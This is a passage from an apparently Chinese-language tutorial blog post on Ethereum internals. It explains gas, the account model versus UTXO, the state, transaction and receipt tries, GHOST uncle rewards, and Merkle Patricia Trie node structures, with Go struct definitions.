<li>storageRoot： Merkle Patricia树的根节点Hash值。Merkle树会将此账户存储内容的Hash值进行编码，默认是空值</li>
<li>codeHash：此账户EVM（以太坊虚拟机，后面细说）代码的hash值。对于合约账户，就是被Hash的代码并作为codeHash保存。对于外部拥有账户，codeHash域是一个空字符串的Hash值</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233067.jpg" alt="img"></p>
<p>可以简单理解EOA就是实际的用户；而合约账户就是EOA用户部署的合约，外部所有的账户（EOA externally owned account）（由私钥控制的）和合约账户（由合约代码控制）。外部所有的账户没有代码，人们可以通过创建和签名一笔交易从一个外部账户发送消息。每当合约账户收到一条消息，合约内部的代码就会被激活，允许它对内部存储进行读取和写入，和发送其它消息或者创建合约。</p>
<p>##图灵完备性</p>
<p>之前在介绍比特币脚本的时候，我们提到过比特币的脚本是故意设计成不完备的，为什么呢？因为之前分析过，在交易中写的脚本，是需要有矿工来执行并进行确认的。如果是图灵完备的，那么有可能会出现死循环的代码，对于矿工而言是非常不利的。</p>
<p>既然以太坊明确地在挑刺儿，也就意味着在以太坊中实现的脚本语言是图灵完备的。既然这样，以太坊必须要解决的问题是，如何应对死循环可能会无限地消耗？</p>
<p>以太坊中引入了gas（瓦斯、油价等中文翻译）的概念。以太坊在区块链上实现了一个运行环境，被称为以太坊虚拟机（EVM），参与到网络的节点都会运行EVM，验证区块中的每个交易并在EVM中运行交易所触发的代码。合约可以利用的每个命令都会有一个相应的费用值，费用使用gas作为单位计数，也即用户付给矿工的佣金。<a href="https://link.zhihu.com/?target=https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit%23gid=0">这里列了一些命令的gas消耗。</a>例：<code>PUSH操作</code>需要消耗<code>3个gas</code>，<code>一次转账</code>一般要消耗<code>21000 gas</code>，gas使用<code>ether</code>（以太币）来支付。</p>
<p>Gas常用的单位是wei，wei和ether的关系如下所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233068.jpg" alt="img"></p>
<p>每笔交易都被要求包括gas limit（startGas，限制）和Gas Price（价格）。Gas Limit 是用户愿意为执行某个操作或确认交易支付的最大Gas量（最少21,000）。Gas Price 是 Gwei 的数量，用户愿意花费于每个 Gas 单位的价钱。发送者支付的Gas Price越高，则其交易的优先级越重要，因为矿工打包该交易获得的报酬会更高，这样这个交易会较快地被打包到区块中，更早地获得确认。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233069.jpg" alt="img"></p>
<p>如果该交易需要使用的gas数量小于或等于所设置的gas limit，那么这个交易会被成功处理。如果gas总消耗超过gas limit，那么所有的操作都会被复原（回滚），但是交易费仍然会被矿工收取。区块链会显示这笔交易完成尝试，但因为没有提供足够的gas导致所有的合约命令都被复原。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233070.jpg" alt="img"></p>
<p>如果交易里gas没有被消耗完毕，剩下的gas都会以以太币（ether）的形式打回给交易发起者。因为gas消耗一般只是一个大致估算，所以许多用户会超额支付gas来保证他们的交易会被接受。这样如果恶意用户在交易中包括了死循环，那么不论付出多少gas，最终都会消耗完。另外，也正是因为这样的代价问题，虽然以太坊的脚本语言是图灵完备的，也即当前的所有代码都可以在以太坊区块链上运行，但是作为开发者，需要认真考虑代码的效率。两个同样功能的合同，效率高的那个才能生存下来。一个帮助人们理解以太坊合同实际能力的启发问题是：这个功能是否能在一个1999年的智能手机上实现？</p>
<p>总结，当进行每笔交易时，用户设定Gas Limit 和Gas Price，在运行时，矿工首先计算 Gas Limit*Gas Price ，就得到了ETH交易佣金的成本，然后这笔费用首先从用户的账户中扣除，交易运行完毕，如果有剩余，再还给用户。如果不够，矿工也不还钱，只是把交易全部回滚。</p>
<p>发送者支付的Gas Price越高，则其交易的优先级越重要，因为矿工的报酬会更高。 但是，通过设置较低燃料价格（GasPrice），发送者可以节省资金。以太坊客户端的Frontier版本有一个默认的gasPrice，即0.05e12 wei。矿工为了最大化他们的收益，如果大量的交易都是使用默认gasPrice即0.05e12 wei，那么基本上就很难要矿工去接受一个低gasPrice交易，更别说0 gasPrice交易了。</p>
<p>除了计算交易的花费之外，将交易或者合约上传也需要费用。虽然读取本地区块链是免费的，但写入和运算是花钱的。储存更是尤其昂贵，因为任何写入的信息都会被永久的储存着。相比之下，CPU运算很便宜。以太坊是图灵完备的，谁也拦不住你写一个视频解码器然后发布在区块链上；只不过估计你没钱运行它。假设这样的程序的代码至少有几千行，即使把它上传到区块链上也不会便宜。譬如，gas limit&#x3D;2000，假设交易长为170字节，每字节的费用是5，减去850，所以还剩1150，剩下的才是运行交易能使用的gas上限。</p>
<p>除此之外，每个块还有Block gas limit，这个值在创世区块的配置文件中可以指定，譬如查看一个区块的信息如下，也即区块的gas limit是3573388。block gas limit的用意是限制一个区块中能够包含的交易的数量。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233071.jpg" alt="img"></p>
<p><strong>（二）Value-blindness</strong></p>
<p>同样的，来回忆一下，比特币为什么放弃了基于账户的概念，而采取UTXO机制的呢？</p>
<p>使用UTXO可以避免维护账户余额的麻烦。为什么维护余额很麻烦呢？因为为了使用余额，也即能够让矿工检查和验证余额，余额必须是全局可见的数据。而基本上每个交易都会对余额产生影响和带来变化。也即，余额必须要全局可见，能快速地更新，而且可以验证。</p>
<p><strong>【UTXO的优点： 1.较高程度的隐私保护。</strong>如果用户每次交易都使用一个新的地址，那么账户之间的相互关联就很困难。这样做适用于对安全性要求高的货币系统。<strong>2.潜在地可扩展性。</strong> UTXO在理论上可扩展性更好。对于维护交易的Merkle树，即使所有的人(包括数据的拥有者)都遗忘了某一数据，真正受损也只有数据的拥有者，其他人不受影响。 但在以太坊账户系统中，任何人弄丢了一个账户对应在默克尔树中信息，那么将无法处理任何能够影响账户的消息。相当于UTXO是一次性的；而账户是可重用的。】</p>
<p>既然以太坊期望可以有明确的价值，必须能够实现余额的概念。余额相对于UTXO也有一些优点：</p>
<p><strong>【1.节省空间。</strong>如果一个账户有5个UTXO，则从UTXO模式转成账户模式所需空间会从300字节降到30字节。具体计算如下： 300 &#x3D; (20+32+8）* 5 （20是地址字节数，32是TX的id字节数，8是交易金额值字节数）; 30 &#x3D; 20 + 8 + 2 ( 20是地址字节数，8是交易金额值字节数，2是nonce②字节数) 但实际节约并没有这么大，因为账户需要被存储在帕特里夏树中。另外以太坊中交易也比比特币中的更小（以太坊中100字节，比特币中200-250字节），因为每次交易只需要生成一次引用，一次签名，以及一个输出。<strong>2.可替代性更高。</strong> 在UTXO结构中，“有效输出”的源码实现中没有区块链层的概念，所以不管是在技术还是法律上，通过建立一个红名单&#x2F;黑名单，并依据的这些“有效输出”的来源区分它们并不是很实际。<strong>3.简单。</strong> 以太坊编码更简单、更易于理解，尤其是在涉及到复杂脚本时。尽管任何去中心化应用都可以用UTXO方式来实现，但这种方式实质上是通过赋予一个脚本限制给定的UTXO能够使用以及请求的UTXO的种类的方式来实现，包括脚本评估的应用更改根状态的默克尔树证明。因此，UTXO实现方式比以太坊使用账户的方式要复杂的多。<strong>4.轻客户端</strong> 轻客户端可以随时通过沿指定方向扫描状态树来访问与账户相关的所有数据。在UTXO方式中，引用随着每个交易的变化而变化，这对于长时间运行并使用了UTXO根状态传播机制的dapp应用来说，无疑是繁重的。】</p>
<p>账户方式的一个弱点是：为了阻止重播攻击，每笔交易必须有nonce，nonce的值是上一次使用的nonce值+1，这就使得账户需要跟踪nonce的使用情况，并且必须确认交易的Nonce值比上次使用的Nonce值大1。解决这个问题的一个简单方法是让交易包含一个区块号，这样过一段时间之后，交易便不能重放了。</p>
<p>为了实现账户方式，以太坊的做法是采用状态(state)的概念存储一系列账户，每个账户都有自己的余额，以及以太坊特有的数据（代码或内部存储器）。</p>
<p>以太坊的状态由每个交易改变，</p>
<p>为了维护这个状态，和比特币不同，比特币在区块中只包括了交易的merkle树根，而以太坊在区块头部中会包括三棵树，分别是世界状态树（world state trie），交易树（transaction trie）以及receipt树。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233072.jpg" alt="img"></p>
<p>世界状态</p>
<p>世界状态是地址（账户）到账户状态的映射。虽然世界状态不保存在区块链上，但在黄皮书的描述中，世界状态也由树来保存数据（此树也被称为状态数据库或者状态树）。世界状态可以被视作为随着交易的执行而持续更新的全局状态，也是以太坊中唯一的全局的数据。</p>
<p>以太坊中所有的账户信息都体现在世界状态之中，并由世界状态树保存，状态树持续更新。对于以太坊网络中的每一个账户，状态树中存放了一个键值对，其中键key是160位的账户的地址，值value是账户的相关信息，如上面图中所展示的，包括</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">- nonce</span><br><span class="line">- balance</span><br><span class="line">- storageRoot</span><br><span class="line">- codeHash</span><br></pre></td></tr></table></figure>

<p>如果想知道某一账户的余额，或者某智能合约当前的状态，就需要通过查询世界状态树来获取该账户的具体状态信息。其中账户存储树是保存与账户相关联数据的结构。该项只有合约账户才有，而在 EOA 中， storageRoot 留空、 codeHash 则是一串空字符串的哈希值。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233073.jpg" alt="img"></p>
<p>为什么以太坊中需要保存用户状态的历史记录，而比特币中不需要呢？因为，比特币中区块生成速度较慢，产生分叉的可能性也较低。而且，即使产生了分叉，由于比特币系统中的交易比较简单，只是简单的转账交易，因此回滚起来比较方便。比较容易实现将被抛弃的分叉中的交易进行回滚。而以太坊就不一样了。以太坊的区块生成速度比较快，十几秒就会产生一个区块，因此产生分叉非常频繁，需要经常进行回滚操作。最重要的一点是，以太坊中有智能合约，使得以太坊是图灵完备的，可以实现很复杂的交易。因此，如果不保存历史记录，就很难进行回滚操作。</p>
<p>交易树</p>
<p>每当发布一个区块时，区块中包含的所有交易，会被组织成一棵交易树，该树是一棵Merkle Patricia Tree，查找的键值是交易在发布时的序号（交易的排列顺序是由发布区块的节点决定的）。<br>交易树用来证明某笔交易在某个区块当中。交易树中包括的交易的细节：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">nonce,</span><br><span class="line">gas price,</span><br><span class="line">gas limit,</span><br><span class="line">recipient,</span><br><span class="line">transfer value,</span><br><span class="line">transaction signature values, and</span><br><span class="line">account initialization (if transaction is of contract creation type), or transaction data (if transaction is a message call)</span><br></pre></td></tr></table></figure>

<p>收据树</p>
<p>每个交易执行完之后，会形成一个收据，记录交易的相关信息，而这些收据会被组织成一棵收据树，该树是一棵Merkle Patricia Tree，查找的键值是交易在发布时的序号（交易的排列顺序是由发布区块的节点决定的）。收据树中对应的交易的信息：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">post-transaction state,</span><br><span class="line">the cumulative gas used,</span><br><span class="line">the set of logs created through execution of the transaction, and</span><br><span class="line">the Bloom filter composed from information in those logs</span><br></pre></td></tr></table></figure>


<p>那么，既然已经有了交易树，为什么还需要收据树这个数据结构呢？<br>因为，以太坊拥有智能合约，而智能合约的执行过程比较复杂，通过增加收据树，有利于系统快速查询执行的结果。<br>在以太坊中，每个交易对应的收据中都会包含一个Bloom filter，记录这个交易的类型、地址等信息。发布的区块的块头中也有一个总的Bloom filter，这个Bloom filter是所有收据中的Bloom filter的并集。<br>如果我们需要查找过去一段时间内发生的和某个智能合约相关的所有交易，首先需要在区块的块头中的Bloom filter中看看有没有我们要查找的交易的类型，如果有的话，再到区块中的每个交易对应的收据的Bloom filter中进行查找；而如果没有的话，那么该区块中一定没有我们要查找的交易类型。通过该种方法，就可以快速排除掉无关的收据，从而提高查找速度。</p>
<p>（三）状态</p>
<p>（四）区块链盲</p>
<p>在脚本图灵完备以及维护了状态树的情况下，以上两个特征实现起来就容易了。</p>
<p>GHOST协议</p>
<p>GHOST（Greedy Heaviest Observed Subtree）是一种主链（非侧链）选择协议。举例来说：经典的Proof-of-Work（POW）是以取最长的主链为基本原则，GHOST协议则是以包含块数最多为基本原则。</p>
<p>在比特币协议中，最长的链被认为是绝对的正确。如果一个块不是最长链的一部分，那么它被称为是“孤块”。一个孤立的块也是合法的，但是发现的稍晚，或者是网络传输稍慢，而没有能成为最长的链的一部分。在比特币中，孤块没有意义，随后将被抛弃，发现这个孤块的矿工也拿不到采矿相关的奖励。例如：挖矿节点A是一个矿池占有全网30%的算力，挖矿节点B占有全网算力的10%，节点A会有70%的概率产生废块，节点B有90%的概率产生废块。</p>
<p>以太坊平均10多秒发布一个区块，<strong>更短的出块时间意味着，临时性分叉的几率将大幅提升</strong>。这是因为当矿工A挖出一个新区块后，需要向全网广播，广播的过程需要时间，由于以太坊出块时间短，其他节点可能还没有收到矿工A发布的区块，就已经挖出了同一高度的区块，这就造成了临时分叉。<strong>在以太坊网络中，临时性分叉发生的几率在8%左右。</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233074.png" alt="img"></p>
<p>同时，如果新旧区块之间产生的间隔太短, 在上面的例子中，则节点A会因为规模效应而比B节点更为高效。所以新旧区块的间隔过短会导致单一的矿池主导全网的挖矿过程。而区块中的数据重复验证6次（若干次）立即永久封存地区块中，一旦51%算力攻击一旦发生，double-spend等糟糕问题会出现，恶意的数据容易永久封存于区块中，整个blockchain系统需要足够长的时间来处理和恢复黑客恶意攻击所造成的破坏。</p>
<p>在以太坊中，根据GHOST协议，不认为孤块没有价值，而是会给与发现孤块的矿工以回报。孤块被称为“叔块”(uncle block)，它们可以为主链的安全作出贡献，也同样能获得奖励，这激励了矿工在新发现的块中去引用叔块，减少了孤块的产生。</p>
<p>Ghost协议解决了两个问题：摒弃了单一的最长链原则, 取而代之的是最大子数原则；孤块奖励问题。</p>
<p>如下图所示：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233075.jpg" alt="img"></p>
<p>如果单纯的计算最长链原则, 主链应该是 0 -&gt; 1B -&gt; 2D -&gt; 3F -&gt; 3F -&gt; 4C -&gt; 5B.<br>如果采用了GHOST协议, 以前的”废块”也会被考虑到主链的计算量中.每一个节点下含一个子树, 兄弟节点之间子树节点最多的被选为主链. 这样一来 0 -&gt; 1B -&gt; 2C -&gt; 3D -&gt; 4B 成为主链,<br>如果采用GHOST协议, 一个攻击者仅仅提供一个1A到6A的长链并不能被认为是主链。</p>
<p>Ghost协议的优势在于：</p>
<ul>
<li>以太坊十几秒的出块间隔，大大增加了孤块的产生，并且降低了安全性。通过鼓励引用叔块，使引用主链获得更多的安全保证（因为孤块本身也是合法的）</li>
<li>比特币中，采矿中心化(大量的集中矿池)成为一个问题。Ghost协议下，叔块也是能够获得报酬，可以一定程度上缓解这个问题。</li>
</ul>
<p>孤块奖励问题：</p>
<ul>
<li>主链节点获得base reward；</li>
<li>一个节点最多引用两个叔块；</li>
<li>叔块必须是区块的前2层~前7层的祖先的直接子块；</li>
<li>被引用过的叔块不能重复引用；</li>
<li>引用叔块的区块，可以获得挖矿报酬的1&#x2F;32，也就是5<strong>1&#x2F;32&#x3D;0.15625 Ether，最多获得2</strong>0.15625&#x3D;0.3125 Ether；</li>
<li>主链节点的兄弟（非主链节点）获得 ((叔块高度+8-当前块的高度)&#x2F;8 )*base reward，如下图表格所示；</li>
<li>交易费用(transaction fee)不会分配给叔块</li>
</ul>
<p>我们通过一个例子来介绍上面的规则。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233076.jpg" alt="img"></p>
<p>假设当前区块高度为107（上图中绿色区块），它能有效引用的叔块，只能是区块高度为101～106的区块，换句说<strong>叔块的有效引用区间，最多只能在7代以内。</strong>上图中黄色区块，区块高度为100，就不在107这个区块的有效引用范围。图中红色的区块，因为<strong>不是最长链上区块的直接子块，这种区块不能成为叔区块。</strong></p>
<p>如果在101和106的区块高度，有多个没被引用的叔块，高度为107的区块做多只能引用两个，而且<strong>一个叔块被它引用后，就不能再被其他区块重复引用。</strong></p>
<p>被引用的叔块获得奖励数量，取决与该叔块和引用区块的“远近”关系。<strong>关系越近，叔块得到奖励越多。</strong>而引用叔块的区块，每引用一个区块，都能得到系统出块奖励的1&#x2F;32，最多只能引用两个区块。当前以太坊新区块获得系统奖励为2枚以太币（2ether），如果叔块在间隔一层就被引用，该叔块将获得出块奖励的7&#x2F;8，也就是1.75ether，如果叔块隔了6层才被引用，它获得奖励只有0.5ether，具体如下表。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233077.jpg" alt="img">间隔层数与叔块奖励的关系</p>
<p>看一个真实的块的情况<a href="https://link.zhihu.com/?target=https://etherscan.io/block/4222300">4222300</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233078.jpg" alt="img"></p>
<hr>
<p>由于以上特性，以太坊的轻客户端比Bitcoin的轻客户端功能更强。Bitcoin的轻客户端可以证明包含的交易，但是它不能进行涉及当前状态的证明（如数字资产的持有，名称注册，金融合约的状态等）。而以太坊的轻客户端能够轻松地进行并核实以下类型的查询答案：</p>
<ul>
<li>这笔交易被包含在特定的区块中了么？</li>
<li>告诉我这个地址在过去30天中，发出X类型事件的所有实例（例如，一个众筹合约完成了它的目标）</li>
<li>目前我的账户余额是多少？</li>
<li>这个账户是否存在？</li>
<li>假装在这个合约中运行这笔交易，它的输出会是什么？</li>
</ul>
<p>第一种是由交易树（transaction tree）来处理的；第三和第四种则是由状态树（state tree）负责处理，第二种则由收据树（receipt tree）处理。计算前四个查询任务是相当简单的。服务器简单地找到对象，获取Merkle分支，并通过分支来回复轻客户端。第五种查询任务同样也是由状态树处理，但它的计算方式会比较复杂。</p>
<p>这些树使用了一个非常重要的数据结构。默克尔帕特里夏树(Merkle Patricia tree&#x2F;trie)，由Alan Reiner提出设想，并在瑞波协议中得到实现，是以太坊的主要数据结构，用于存储所有账户状态，以及每个区块中的交易和收据数据。MPT是默克尔树和帕特里夏树的结合缩写，结合这两种树创建的结构具有以下属性：</p>
<ol>
<li>每个唯一键值对唯一映射到根的hash值；在MPT中，不可能仅用一个键值对来欺骗成员（除非攻击者有~2^128 的算力）；</li>
<li>增、删、改键值对的时间复杂度是对数级别。</li>
</ol>
<p>MPT为我们提供了一个高效、易更新、且代表整个状态树的“指纹”。</p>
<p>二叉Merkle树对于验证“清单”格式的信息而言，是非常好的数据结构，本质上来讲，它就是一系列前后相连的数据块。对于交易树来说，它们也同样是不错的，因为一旦树已经建立，花多少时间来编辑这棵树并不重要，树一旦建立了，它就会永远存在。</p>
<p>而对状态树来说，情况会更复杂些。以太坊中的状态树基本上包含了一个键值映射，其中的键是地址还有各种值，包括账户的声明、余额、随机数、代码以及每一个账户的存储（其中存储本身就是一颗树）。例如，the Morden testnet 的创始状态如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">&#123; &quot;0000000000000000000000000000000000000001&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000002&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000003&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;0000000000000000000000000000000000000004&quot;: &#123; &quot;balance&quot;: &quot;1&quot; &#125;, &quot;102e61f5d8f9bc71d0ad4a084df4e65e05ce0e1c&quot;: &#123; &quot;balance&quot;: &quot;1606938044258990275541962092341162602522202993782792835301376&quot; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>不同于交易历史记录，状态树需要经常地进行更新：账户余额和账户的随机数nonce经常会更变，更重要的是，新的账户会频繁地插入，存储的键（ key）也会经常被插入以及删除。MPT的数据结构设计，使得我们可以在一次插入、更新编辑或者删除操作之后，快速地计算出新的树根（tree root），而无需重新计算整颗树。此外，它还有两个非常好的特性：</p>
<ol>
<li>树的深度是有限制的。考虑到攻击者会故意地制造一些交易，使得这棵树尽可能地深，从而可以通过操纵树的深度，执行拒绝服务攻击（DOS attack），使得更新变得极其缓慢。</li>
<li>树的根只取决于数据，和其中的更新顺序无关。换个顺序进行更新，甚至重新从头计算树，并不会改变根。</li>
</ol>
<p><strong>帕特里夏树（Patricia Trees）（压缩前缀树）</strong></p>
<p>Merkle Patricia Tree（又称为Merkle Patricia Trie）是一种经过改良的、融合了默克尔树和前缀树两种树结构优点的数据结构，是以太坊中用来组织管理账户数据、生成交易集合哈希的重要数据结构。</p>
<p>MPT结合了（1）radix trie (patricia)（2）Merkle tree两种树结构的特点与优势 ，因为Merkle树之前已经详细介绍过，所以这里直接讨论前缀树以及压缩前缀树（patricia树）。</p>
<p>Trie树，又称前缀树或字典树，是一种有序树，用于保存关联数组，其中的键通常是字符串。与二叉查找树不同，键不是直接保存在节点中，而是由节点在树中的位置决定。一个节点的所有子孙都有相同的前缀，也就是这个节点对应的字符串，而根节点对应空字符串。</p>
<p>下面这棵trie包含这样一组单词，inn, int, at, age, adv, ant 每个节点存储的是字符串中的部分字符，每个从根到某个节点的路径（不一定到叶子节点）代表了一个存储的字符串，如果想查找adv是否存在，只需要走红圈这样的路径即可。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233079.jpg" alt="img"></p>
<p>Trie的核心思想是空间换时间。利用字符串的公共前缀来降低查询时间的开销以达到提高效率的目的。它有3个基本性质：</p>
<ol>
<li>根节点不包含字符，除根节点外每一个节点都只包含一个字符。</li>
<li>从根节点到某一节点，路径上经过的字符连接起来，为该节点对应的字符串。</li>
<li>每个节点的所有子节点包含的字符都不相同。</li>
</ol>
<p>典型应用是用于统计和排序大量的字符串（但不仅限于字符串），所以经常被搜索引擎系统用于文本词频统计。它的优点是：最大限度地减少无谓的字符串比较。举个具体的例子：</p>
<p>题目：给你100000个长度不超过10的单词。对于每一个单词，我们要判断它出没出现过，如果出现了，求第一次出现在第几个位置。<br>分析：这题当然可以用hash来解决，但是比如说对于某一个单词，我们要询问它的前缀是否出现过。这样hash就不太适用，而用trie还是很简单。<br>现在回到例子中，如果我们用最朴实的方法，对于每一个单词，我们都要去查找它前面的单词中是否有它。那么这个算法的复杂度就是O(n^2)。显然对于100000的范围难以接受。现在我们换个思路想。假设我要查询的单词是abcd，那么在前面的单词中，以b，c，d，f之类开头的显然不必考虑。而只要找以a开头的中是否存在abcd就可以了。同样的，在以a开头中的单词中，我们只要考虑以b作为第二个字母的，一次次缩小范围和提高针对性，这样一个树的模型就渐渐清晰了。<br>好比假设有b，abc，abd，bcd，abcd，efg，hii 这6个单词，我们构建的树就是如下图这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233080.jpg" alt="img"></p>
<p>如上图所示，对于每一个节点，从根遍历到他的过程就是一个单词，如果这个节点被标记为红色，就表示这个单词存在，否则不存在。那么，对于一个单词，我只要顺着从根走到对应的节点，再看这个节点是否被标记为红色就可以知道它是否出现过了。把这个节点标记为红色，就相当于插入了这个单词。这样一来我们查询和插入可以一起完成，所用时间仅仅为单词长度，在这一个样例，便是10。</p>
<p>以上只是简化表示，实际上，trie每个节点是一个确定长度的数组，数组中每个节点的值是一个指向子节点的指针，最后有个标志域，标识这个位置为止是否是一个完整的字符串。从这个意义上讲，trie树每一层的节点数是26^i级别的，但实际上并没有这么多，很多位置的相应指针为空。</p>
<p>常见的用来存英文单词的trie每个节点是一个长度为27的指针数组，index0-25代表a-z字符，26为标志域。如图：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233081.jpg" alt="img"></p>
<p>缺点：</p>
<ul>
<li>直接查找效率较低</li>
</ul>
<p>前缀树的查找效率是O(m)，m为所查找节点的key长度，而哈希表的查找效率为O(1)。且一次查找会有m次IO开销，相比于直接查找，无论是速率、还是对磁盘的压力都比较大。</p>
<ul>
<li>可能会造成空间浪费</li>
</ul>
<p>当存在一个节点，其key值内容很长（如一串很长的字符串），当树中没有与他相同前缀的分支时，为了存储该节点，需要创建许多非叶子节点来构建根节点到该节点间的路径，造成了存储空间的浪费。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233082.jpg" alt="img"></p>
<p><strong>对前缀树的改进：Patricia树</strong></p>
<p>Patricia trie，压缩前缀树，是一种更节省空间的Trie。对于基数树的每个节点，如果该节点是唯一的儿子的话，就和父节点合并。</p>
<p>如之前所提及的，前缀树中会出现严重的存储空间浪费的情况，如上图。图中右侧有一长串节点，这些节点大部分只是充当非叶子节点，用来构建一条路径，目的只是为了存储该路径上的叶子节点。</p>
<p>针对这种情况，MPT树对此进行了优化：当MPT试图插入一个节点，插入过程中发现目前没有与该节点Key拥有相同前缀的路径。此时MPT把<strong>剩余的Key</strong>存储在叶子／扩展节点的Key字段中，充当一个”Shortcut“。</p>
<p>下图中对应着将5个单词test、toaster、toasting、slow、slowly插入到树中，其中有三个单词共享t前缀，两个单词共享s前缀，t和s不同，所以在根节点上有两个分支。在左边的分支（t）上，有两个分支，而且est是没有和其他任何单词共享前缀，也即父节点只有一个孩子，则est可以被压缩。类似地oast和slow以及ly可以进行压缩。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233083.jpg" alt="img"></p>
<p>这种做法有以下几点优势：</p>
<ul>
<li>提高节点的查找效率，避免过多的磁盘访问；</li>
<li>减少存储空间浪费，避免存储无用的节点；</li>
</ul>
<p>另外，再看一个例子，这种树可以用来存键值对，key就是路径上的字符串，value的值存储在叶子节点。：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233084.jpg" alt="img"></p>
<p>树中所存储的键值对：</p>
<ul>
<li>6c0a5c71ec20bq3w &#x3D;&gt; 5</li>
<li>6c0a5c71ec20CX7j &#x3D;&gt; 27</li>
<li>6c0a5c71781a1FXq &#x3D;&gt; 18</li>
<li>6c0a5c71781a9Dog &#x3D;&gt; 64</li>
<li>6c0a8f743b95zUfe &#x3D;&gt; 30</li>
<li>6c0a8f743b95jx5R &#x3D;&gt; 2</li>
<li>6c0a8f740d16y03G &#x3D;&gt; 43</li>
<li>6c0a8f740d16vcc1 &#x3D;&gt; 48</li>
</ul>
<p>就以太坊而言，状态树的键 &#x2F; 值映射是地址与相关账户之间的映射，即指向每个账户的 balance、nonce、codeHash 和 storageRoot。</p>
<hr>
<p><strong>在以太坊中的MPT树中，树节点可以分为以下四类：</strong></p>
<ul>
<li>空节点：(represented as the empty string)</li>
<li>分支节点：A 17-item node<code>[ v0 ... v15, vt ]</code></li>
<li>叶子节点：A 2-item node<code>[ encodedPath, value ]</code></li>
<li>扩展节点：A 2-item node<code>[ encodedPath, key ]</code></li>
</ul>
<p>空节点，简单的表示空，在代码中是一个空串。</p>
<p>叶子节点（leaf），表示为[key,value]的一个键值对，其中key是key的一种特殊十六进制编码，value是value的RLP编码。</p>
<p>扩展节点（extension），也是[key，value]的一个键值对，但是这里的value是其他节点的hash值，这个hash可以被用来查询数据库中的节点。也就是说通过hash链接到其他节点。</p>
<p>分支节点（branch），因为MPT树中的key被编码成一种特殊的16进制的表示，再加上最后的value，所以分支节点是一个长度为17的list，前16个元素对应着key中的16个可能的十六进制字符，如果有一个[key,value]对在这个分支节点终止，最后一个元素代表一个值，即分支节点既可以搜索路径的终止也可以是路径的中间节点。</p>
<p><strong>分支节点</strong></p>
<p>分支节点用来表示MPT树中所有拥有超过1个孩子节点以上的非叶子节点， 其定义如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">type fullNode struct &#123;</span><br><span class="line">        Children [17]node // Actual trie node data to encode/decode (needs custom encoder)</span><br><span class="line">        flags    nodeFlag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// nodeFlag contains caching-related metadata about a node.</span><br><span class="line">type nodeFlag struct &#123;</span><br><span class="line">    hash  hashNode // cached hash of the node (may be nil)</span><br><span class="line">    gen   uint16   // cache generation counter</span><br><span class="line">    dirty bool     // whether the node has changes that must be written to the database</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与前缀树相同，MPT同样是把key-value数据项的key编码在树的路径中，但是key的每一个字节值的范围太大（[0-127]），因此在以太坊中，在进行树操作之前，首先会进行一个key编码的转换（下节会详述），将一个字节的高低四位内容分拆成两个字节存储。通过编码转换，<code>key&#39;</code>的每一位的值范围都在[0, 15]内。因此，一个分支节点的孩子至多只有16个。以太坊通过这种方式，减小了每个分支节点的容量，但是增加了树高。</p>
<p>分支节点的孩子列表中，最后一个元素是用来存储自身的内容。</p>
<p>此外，每个分支节点会有一个附带的字段<code>nodeFlag</code>，记录了一些辅助数据：</p>
<ul>
<li>节点哈希：若该字段不为空，则当需要进行哈希计算时，可以跳过计算过程而直接使用上次计算的结果（当节点变脏时，该字段被置空）；</li>
<li>脏标志：当一个节点被修改时，该标志位被置为1；</li>
<li>诞生标志：当该节点第一次被载入内存中（或被修改时），会被赋予一个计数值作为诞生标志，该标志会被作为节点驱除的依据，清除内存中“太老”的未被修改的节点，防止占用的内存空间过多；</li>
</ul>
<p><strong>叶子节点&amp;&amp;扩展节点</strong></p>
<p>叶子节点与扩展节点的定义相似，如下所示：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">type shortNode struct &#123;</span><br><span class="line">        Key   []byte</span><br><span class="line">        Val   node</span><br><span class="line">        flags nodeFlag</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中关键的字段为：</p>
<ul>
<li>Key：用来存储***属于该节点范围的key***；</li>
<li>Val：用来存储该节点的内容；</li>
</ul>
